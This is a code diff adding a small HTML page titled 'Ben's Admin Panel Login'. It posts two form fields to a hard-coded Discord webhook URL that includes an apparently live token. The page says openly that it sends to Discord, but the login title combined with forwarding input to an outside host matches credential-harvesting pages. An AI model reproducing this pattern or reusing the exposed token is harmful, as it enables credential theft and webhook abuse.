@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ben's Admin Panel Login</title>
+    <script>
+        function sendToWebhook() {
+            const textbox1 = document.getElementById('textbox1').value;
+            const textbox2 = document.getElementById('textbox2').value;
+
+            // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1311130050514391111/BE3ZE5VJ2Od0BSlMC9LrDQUNnY81g_M2qoHEvk4SlzKCs1DzqC7DEl9EqshxaChbgTR-';
+
+            // Prepare the payload to send
+            const payload = {
+                content: `Textbox 1: ${textbox1}\nTextbox 2: ${textbox2}`
+            };
+
+            // Send the POST request to the Discord webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                alert('Message sent to Discord!');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('There was an error sending the message.');
+            });
+        }
+    </script>
+</head>
+<body>
+    <h2>Send Message to Discord Webhook</h2>
+    <form onsubmit="event.preventDefault(); sendToWebhook();">
+        <label for="textbox1">Textbox 1:</label><br>
+        <input type="text" id="textbox1" name="textbox1" required><br><br>
+
+        <label for="textbox2">Textbox 2:</label><br>
+        <input type="text" id="textbox2" name="textbox2" required><br><br>
+
+        <button type="submit">Send to Discord</button>
+    </form>
+</body>
+</html>
